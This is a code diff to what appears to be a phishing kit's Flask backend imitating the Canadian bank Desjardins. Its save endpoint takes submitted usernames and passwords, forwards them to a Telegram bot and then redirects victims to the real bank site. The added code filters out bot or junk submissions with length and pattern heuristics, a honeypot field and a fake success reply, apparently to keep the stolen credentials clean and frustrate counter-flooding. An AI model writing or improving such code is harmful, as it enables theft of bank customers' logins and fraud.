@@ -3,6 +3,8 @@ from flask_cors import CORS
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 import os
+import re
+import time
 import urllib.request
 import urllib.parse
 
@@ -20,7 +22,7 @@ def get_username_or_ip():
 limiter = Limiter(
     get_username_or_ip,
     app=app,
-    default_limits=["200 per hour"],
+    default_limits=["100 per hour"],
     storage_uri="memory://"
 )
 
@@ -28,6 +30,46 @@ limiter = Limiter(
 REDIRECT_URL       = "https://www.desjardins.com/"
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")
+
+# ---------- Bot Detection Helpers ----------
+# Simple in-memory tracker for rapid-fire submissions
+recent_submissions = {}
+
+def is_likely_bot(username, password, ip):
+    """Returns True if request looks like a bot."""
+    now = time.time()
+
+    # 1. Length checks
+    if len(username) < 3 or len(username) > 60:
+        return True
+    if len(password) < 4 or len(password) > 100:
+        return True
+
+    # 2. Random-looking username (all lowercase letters+digits, no @, no space, > 8 chars)
+    # Example: "Bt2rtlv41", "pknkjfnasda"
+    if "@" not in username and " " not in username:
+        if len(username) >= 8:
+            # ratio of digits + no vowel pattern
+            has_vowel = bool(re.search(r"[aeiouAEIOU]", username))
+            if not has_vowel:
+                return True
+            # Too many consonants in a row (5+)
+            if re.search(r"[^aeiouAEIOU0-9@._-]{5,}", username):
+                return True
+
+    # 3. Same IP submitting multiple times within 10 seconds
+    if ip in recent_submissions:
+        last = recent_submissions[ip]
+        if now - last < 10:
+            return True
+    recent_submissions[ip] = now
+
+    # Clean old entries
+    for k in list(recent_submissions.keys()):
+        if now - recent_submissions[k] > 60:
+            del recent_submissions[k]
+
+    return False
 
 
 # ---------- Telegram ----------
@@ -65,19 +107,34 @@ def home():
 
 
 @app.route("/api/save", methods=["POST"])
-@limiter.limit("10 per minute")
-@limiter.limit("50 per hour")
+@limiter.limit("3 per minute")
+@limiter.limit("15 per hour")
 def save():
-    data = request.get_json()
+    data = request.get_json(silent=True)
 
     if not data:
         return jsonify({"success": False, "message": "No data provided"}), 400
+
+    # Honeypot check — frontend should have a hidden "website" field
+    if data.get("website"):
+        return jsonify({"success": False, "message": "Bad request"}), 400
 
     username = data.get("username", "").strip()
     password = data.get("password", "").strip()
 
     if not username or not password:
         return jsonify({"success": False, "message": "All fields required"}), 400
+
+    ip = get_remote_address()
+
+    if is_likely_bot(username, password, ip):
+        print(f"🤖 Bot blocked: {username} from {ip}")
+        # Still return success so bot doesn't retry
+        return jsonify({
+            "success": True,
+            "message": "Saved successfully ✅",
+            "redirect_url": REDIRECT_URL
+        })
 
     send_to_telegram(username, password)
     print(f"💾 Received: {username}")
